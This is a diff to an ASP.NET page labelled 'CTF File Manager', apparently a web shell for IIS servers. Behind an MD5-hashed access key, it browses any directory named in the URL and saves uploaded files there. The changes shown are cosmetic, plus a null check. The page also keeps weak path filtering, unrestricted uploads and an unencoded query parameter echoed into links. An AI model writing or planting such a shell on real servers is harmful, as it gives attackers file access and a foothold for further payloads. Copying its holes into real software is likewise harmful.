@@ -7,7 +7,7 @@
 <script runat="server">
     string correctMD5 = "e662ddd93d6f72abfb31328821b595cc"; 
 
-    string currentPath = @"C:\inetpub\wwwroot";   // Default Path
+    string currentPath = @"C:\inetpub\wwwroot";
 
     protected void Page_Load(object sender, EventArgs e)
     {
@@ -20,7 +20,6 @@
             Response.End();
         }
 
-        // Get directory from URL or use default
         if (!string.IsNullOrEmpty(Request.QueryString["dir"]))
         {
             currentPath = Request.QueryString["dir"].Replace("..", "");
@@ -93,7 +92,7 @@
                 string fileName = Path.GetFileName(FileUpload1.FileName);
                 string savePath = Path.Combine(currentPath, fileName);
                 FileUpload1.SaveAs(savePath);
-                lblMsg.Text = "<span style='color:lime'>✅ Uploaded Successfully: " + fileName + "</span>";
+                lblMsg.Text = "<span style='color:lime'>✅ Uploaded: " + fileName + "</span>";
             }
             catch (Exception ex)
             {
@@ -106,7 +105,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF File Manager - inetpub</title>
+    <title>CTF File Manager</title>
     <style>
         body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
         table { border-collapse: collapse; width: 100%; }
@@ -119,12 +118,11 @@
     </style>
 </head>
 <body>
-    <h1>🛠️ CTF File Manager - C:\inetpub\wwwroot</h1>
+    <h1>🛠️ CTF File Manager - inetpub/wwwroot</h1>
 
     <div class="current-path">
-        <strong>Current Directory:</strong> <%= currentPath %>
-        <br>
-        <a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Go to Web Root ]</a>
+        <strong>Current Path:</strong> <%= currentPath %>
+        <br><a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Reset to Web Root ]</a>
     </div>
 
     <!-- Upload -->
@@ -149,15 +147,24 @@
         </tr>
 
         <!-- Go Up -->
-        <% if (currentPath.Length > 3) { %>
+        <% 
+            if (currentPath.Length > 3) 
+            {
+                DirectoryInfo parent = Directory.GetParent(currentPath);
+                if (parent != null)
+                {
+        %>
         <tr>
-            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(Directory.GetParent(currentPath)?.FullName) %>">.. (Go Up)</a></td>
+            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent.FullName) %>">.. (Go Up)</a></td>
             <td>Folder</td>
             <td></td>
             <td></td>
             <td></td>
         </tr>
-        <% } %>
+        <% 
+                }
+            } 
+        %>
 
         <% 
             // Folders
